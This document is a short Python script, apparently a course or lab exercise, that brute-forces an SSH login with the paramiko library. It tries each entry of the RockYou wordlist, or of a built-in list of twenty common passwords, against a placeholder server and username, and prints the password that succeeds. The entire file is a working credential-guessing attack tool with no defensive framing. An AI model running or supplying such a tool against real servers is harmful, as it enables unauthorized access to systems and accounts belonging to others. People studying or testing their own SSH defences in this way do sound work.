#!/usr/bin/env python3

# Rodolfo Gonzalez
# January 30 2024


import time
import os
import paramiko

# Set the SSH server information
SSH_IP = "your_ssh_server_ip"  # Replace with the actual IP address of the SSH server
SSH_USERNAME = "your_ssh_username"  # Replace with the actual SSH username

##################### === Function for SSH Brute Force ===###################
def ssh_brute_force(wordlist_path):
    try:
        # Open the wordlist file in binary mode and read all lines
        with open(wordlist_path, 'rb') as wordlist_file:
            words = [line.strip() for line in wordlist_file.readlines()]

        # Initialize SSH client
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Iterate through and try each word as the password
        for word in words:
            password = word.decode('utf-8', errors='ignore')
            print(f"Attempting password: {password}")

            try:
                # Connect to the SSH server
                ssh_client.connect(SSH_IP, username=SSH_USERNAME, password=password)

                # If successful, print a message and break the loop
                print(f"Password found: {password}")
                break

            except paramiko.AuthenticationException:
                # Password authentication failed, continue with the next password
                pass

        # Close the SSH client
        ssh_client.close()

    except FileNotFoundError:
        print("Word list file not found.")
    except KeyboardInterrupt:
        print("Operation aborted by the user.")

##################### === Main program ===###################
if __name__ == "__main__":
    try:
        print("Choose a wordlist:")
        print("1. RockYou.txt")
        print("2. Small wordlist (provided in code)")

        choice = input("Enter your choice (1 or 2): ")

        if choice == "1":
            wordlist_path = os.path.expanduser("~/Documents/rockyou.txt")
        elif choice == "2":
            # Define the small wordlist directly in the code
            small_wordlist = [
                "123456", "password", "123456789", "12345", "12345678",
                "qwerty", "1234567", "kali", "ubuntu", "123123",
                "abc123", "1234", "password1", "iloveyou", "1q2w3e4r",
                "000000", "qwerty123", "zaq12wsx", "dragon", "sunshine"
            ]
            small_wordlist_path = os.path.expanduser("~/Documents/small_wordlist.txt")
            with open(small_wordlist_path, 'w') as small_wordlist_file:
                small_wordlist_file.write("\n".join(small_wordlist))
            wordlist_path = small_wordlist_path
        else:
            print("Invalid choice. Exiting.")
            exit()

        ssh_brute_force(wordlist_path)

    except KeyboardInterrupt:
        print("Operation aborted by the user.")

